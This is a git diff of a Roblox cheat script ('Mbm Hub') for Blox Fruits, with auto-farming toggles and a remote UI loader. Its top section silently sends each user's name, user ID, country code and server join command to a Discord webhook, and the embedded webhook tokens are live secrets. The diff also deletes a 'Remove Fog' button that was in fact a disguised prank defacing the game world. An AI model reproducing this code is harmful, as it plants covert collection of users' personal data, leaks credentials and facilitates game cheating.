@@ -1,146 +1,146 @@
 if game:GetService("Workspace").Map:FindFirstChild("KitsuneIsland") then
-                        local HttpService = game:GetService("HttpService")
-                        local Data =
-                            {
-                                ["embeds"]= {
-                                   {
-    
-                                        ["fields"]= {
-    
-                                            {
-                                                ["name"]= "Kitsune island🏝",
-                                                ["value"]= "```found 👁‍🗨```",
-                                                ["inline"]= true
-                                            },
-                                            {
-                                                ["name"]= "join server",
-                                                ["value"]= '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```',
-                                                ["inline"]= true
-                                            },
-                                        }              
-                                    }
-                                }
-                                }
-    
-                        local Headers = {["Content-Type"]="application/json"}
-                        local Encoded = HttpService:JSONEncode(Data)
-    
-                        Request = http_request or request or HttpPost or syn.request
-                        local Final1 = {Url = "https://discord.com/api/webhooks/1203291824652034099/D3ItzN3fzBaVEMkmB7A6q5FlmWamzgzs52kfn8GDITnfnkaYoVxYdVafVQnfOOkWNxxP" , Body = Encoded, Method = "POST", Headers = Headers}
-    
-                        Request(Final1)
-               end
-    local LocalizationService = game:GetService("LocalizationService")
-    local player = game.Players.LocalPlayer
     local HttpService = game:GetService("HttpService")
-    
-    local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
-    local data = {
-        embeds = {
-            {
-                title = "Profile",
-                url = "https://www.roblox.com/users/" .. player.UserId,
-                description = "||```" .. player.DisplayName .. " (" .. player.Name .. ") ```||",
-                color = tonumber(322852),
-                fields = {
-                    {
-                        name = "country",
-                        value = "```Player's country code: " .. code .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "server",
-                        value = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```',
-                        inline = true
-                    },
-                    {
-                        name = "ty for using",
-                        value = "Main script Mbm Hub",
-                        inline = true
-                    }
+    local Data =
+        {
+            ["embeds"]= {
+               {
+
+                    ["fields"]= {
+
+                        {
+                            ["name"]= "Kitsune island🏝",
+                            ["value"]= "```found 👁‍🗨```",
+                            ["inline"]= true
+                        },
+                        {
+                            ["name"]= "join server",
+                            ["value"]= '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```',
+                            ["inline"]= true
+                        },
+                    }              
                 }
             }
-        }
-    }
-    
-    local jsonData = HttpService:JSONEncode(data)
-    local webhookUrl = "https://discord.com/api/webhooks/1211297392289390662/gTMyXvwnt51R3D3BI0vrfHCPSvf9s4ZqenlQlbV-HXHBuGSB-TkrdDlscncWBOP8KzQV"
-    local headers = {["Content-Type"] = "application/json"}
-    local request = http_request or request or HttpPost or syn.request
-    local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}
-    
-    local success, response = pcall(request, final)
-    if success then
-        print("Profile information sent to Discord.")
-    else
-        print("Failed to send profile information to Discord: " .. response)
-    end
-                    if game.PlaceId == 7449423635 then 
-                    if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149052" then
-                        local HttpService = game:GetService("HttpService")
-                        local Data =
-                            {
-                                ["embeds"]= {
-                                   {
-    
-                                        ["fields"]= {
-    
-                                            {
-                                                ["name"]= "moon : 3/4 (🌘)",
-                                                ["value"]= "who want do trial?🕋",
-                                                ["inline"]= true
-                                            },
-                                            {
-                                                ["name"]= "join server",
-                                                ["value"]= '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'```", game.Players.LocalPlayer)',
-                                                ["inline"]= true
-                                            },
-                                        }              
-                                    }
-                                }
-                                }
-    
-                        local Headers = {["Content-Type"]="application/json"}
-                        local Encoded = HttpService:JSONEncode(Data)
-    
-                        Request = http_request or request or HttpPost or syn.request
-                        local Final1 = {Url = "https://discord.com/api/webhooks/1203291664316239882/NF4-ZWugZLt1Uu4_iImSCIsDoIXuolXgFWC8jlRRB1pHtUuD_bhlr5YhE9LFrp7zNdoJ" , Body = Encoded, Method = "POST", Headers = Headers}
-    
-                        Request(Final1)
-                    end
-                    end
+            }
+
+    local Headers = {["Content-Type"]="application/json"}
+    local Encoded = HttpService:JSONEncode(Data)
+
+    Request = http_request or request or HttpPost or syn.request
+    local Final1 = {Url = "https://discord.com/api/webhooks/1203291824652034099/D3ItzN3fzBaVEMkmB7A6q5FlmWamzgzs52kfn8GDITnfnkaYoVxYdVafVQnfOOkWNxxP" , Body = Encoded, Method = "POST", Headers = Headers}
+
+    Request(Final1)
+end
+local LocalizationService = game:GetService("LocalizationService")
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
+local data = {
+embeds = {
+{
+title = "Profile",
+url = "https://www.roblox.com/users/" .. player.UserId,
+description = "```" .. player.DisplayName .. " (" .. player.Name .. ") ```",
+color = tonumber(322852),
+fields = {
+{
+    name = "country",
+    value = "```Player's country code: " .. code .. "```",
+    inline = true
+},
+{
+    name = "server",
+    value = '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```',
+    inline = true
+},
+{
+    name = "ty for using",
+    value = "Main script Mbm Hub",
+    inline = true
+}
+}
+}
+}
+}
+
+local jsonData = HttpService:JSONEncode(data)
+local webhookUrl = "https://discord.com/api/webhooks/1211297392289390662/gTMyXvwnt51R3D3BI0vrfHCPSvf9s4ZqenlQlbV-HXHBuGSB-TkrdDlscncWBOP8KzQV"
+local headers = {["Content-Type"] = "application/json"}
+local request = http_request or request or HttpPost or syn.request
+local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}
+
+local success, response = pcall(request, final)
+if success then
+print("+1 User excuted")
+else
+print("Failed to get profile user or excutor: " .. response)
+end
+if game.PlaceId == 7449423635 then 
+if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149052" then
+    local HttpService = game:GetService("HttpService")
+    local Data =
+        {
+            ["embeds"]= {
+               {
+
+                    ["fields"]= {
+
+                        {
+                            ["name"]= "moon : 3/4 (🌘)",
+                            ["value"]= "who want do trial?🕋",
+                            ["inline"]= true
+                        },
+                        {
+                            ["name"]= "join server",
+                            ["value"]= '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'```", game.Players.LocalPlayer)',
+                            ["inline"]= true
+                        },
+                    }              
+                }
+            }
+            }
+
+    local Headers = {["Content-Type"]="application/json"}
+    local Encoded = HttpService:JSONEncode(Data)
+
+    Request = http_request or request or HttpPost or syn.request
+    local Final1 = {Url = "https://discord.com/api/webhooks/1203291664316239882/NF4-ZWugZLt1Uu4_iImSCIsDoIXuolXgFWC8jlRRB1pHtUuD_bhlr5YhE9LFrp7zNdoJ" , Body = Encoded, Method = "POST", Headers = Headers}
+
+    Request(Final1)
+end
+end
 if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
-                        local HttpService = game:GetService("HttpService")
-                        local Data =
-                            {
-                                ["embeds"]= {
-                                   {
-    
-                                        ["fields"]= {
-    
-                                            {
-                                                ["name"]= "Mirage island🏝",
-                                                ["value"]= "```found 👁‍🗨```",
-                                                ["inline"]= true
-                                            },
-                                            {
-                                                ["name"]= "join server",
-                                                ["value"]= '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```',
-                                                ["inline"]= true
-                                            },
-                                        }              
-                                    }
-                                }
-                                }
-    
-                        local Headers = {["Content-Type"]="application/json"}
-                        local Encoded = HttpService:JSONEncode(Data)
-    
-                        Request = http_request or request or HttpPost or syn.request
-                        local Final1 = {Url = "https://discord.com/api/webhooks/1203291824652034099/D3ItzN3fzBaVEMkmB7A6q5FlmWamzgzs52kfn8GDITnfnkaYoVxYdVafVQnfOOkWNxxP" , Body = Encoded, Method = "POST", Headers = Headers}
-    
-                        Request(Final1)
-               end
+    local HttpService = game:GetService("HttpService")
+    local Data =
+        {
+            ["embeds"]= {
+               {
+
+                    ["fields"]= {
+
+                        {
+                            ["name"]= "Mirage island🏝",
+                            ["value"]= "```found 👁‍🗨```",
+                            ["inline"]= true
+                        },
+                        {
+                            ["name"]= "join server",
+                            ["value"]= '```game:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```',
+                            ["inline"]= true
+                        },
+                    }              
+                }
+            }
+            }
+
+    local Headers = {["Content-Type"]="application/json"}
+    local Encoded = HttpService:JSONEncode(Data)
+
+    Request = http_request or request or HttpPost or syn.request
+    local Final1 = {Url = "https://discord.com/api/webhooks/1203291824652034099/D3ItzN3fzBaVEMkmB7A6q5FlmWamzgzs52kfn8GDITnfnkaYoVxYdVafVQnfOOkWNxxP" , Body = Encoded, Method = "POST", Headers = Headers}
+
+    Request(Final1)
+end
 ----------------------------------------------------------------------------------------------------------------------------------------------
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
@@ -5364,7 +5364,20 @@ elseif Third_Sea then
         end
     })
 end
-
+local ToggleAwake = Tabs.Raid:AddToggle("ToggleAwake", {Title = "Auto Awakening", Default = false })
+ToggleAwake:OnChanged(function(Value)
+    AutoAwakenAbilities = Value
+end)
+Options.ToggleAwake:SetValue(false)
+spawn(function()
+    while task.wait() do
+        if AutoAwakenAbilities then
+            pcall(function()
+                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Awakener","Awaken")
+            end)
+        end
+    end
+end)
 
 
 local Mastery = Tabs.Raid:AddSection("Law Raid")
@@ -6024,71 +6037,6 @@ Tabs.Misc:AddButton({
 	Callback = function()
         game:GetService("Lighting").LightingLayers:Destroy()
 	    game:GetService("Lighting").Sky:Destroy()
-    end
-})
-
-Tabs.Misc:AddButton({
-	Title = "Remove Fog",
-	Description = "",
-	Callback = function()
-        local ID = 13980517643
-        function spamDecal(v)
-            if v:IsA("Part") then
-                for i=0, 5 do
-                    D = Instance.new("Decal")
-                    D.Name = "Mbm Hub"
-                    D.Face = i
-                    D.Parent = v
-                    D.Texture = ("http://www.roblox.com/asset/?id="..Id)
-                end
-            else
-                if v:IsA("Model") then
-                    for a,b in pairs(v:GetChildren()) do
-                        spamDecal(b)
-                    end
-                end
-            end
-        end
-        function decalspam(id)
-            Id = id
-            for i,v in pairs(game.Workspace:GetChildren()) do
-                if v:IsA("Part") then
-                for i=0, 5 do
-                    D = Instance.new("Decal")
-                    D.Name = "Mbm Hub"
-                    D.Face = i
-                    D.Parent = v
-                    D.Texture = ("http://www.roblox.com/asset/?id="..id)
-                end
-            else
-                if v:IsA("Model") then
-                    for a,b in pairs(v:GetChildren()) do
-                        spamDecal(b)
-                    end
-                end
-            end
-        end
-        end
-         
-        decalspam(ID)
-        wait(0.01)
-          sound = Instance.new("Sound",workspace)
-        sound.Name = "DEAD"
-        sound.SoundId = "rbxassetid://3286324479"
-        sound:Play()
-        sound.Looped = true
-        repeat
-        wait(1)
-        until sound.IsLoaded == true
-        wait(13)
-        de = Instance.new("DistortionSoundEffect",sound)
-        de.Level = 0.8
-        sky = Instance.new("Sky",game:GetService("Lighting"))
-        sky.SkyboxBk = "http://www.roblox.com/asset/?id=13980517643"
-        sky.SkyboxFt = "http://www.roblox.com/asset/?id=13980517643"
-        sky.SkyboxLf = "http://www.roblox.com/asset/?id=13980517643"
-        sky.SkyboxRt = "http://www.roblox.com/asset/?id=13980517643"
-        sky.SkyboxUp = "http://www.roblox.com/asset/?id=13980517643"
     end
 })
 --Hop
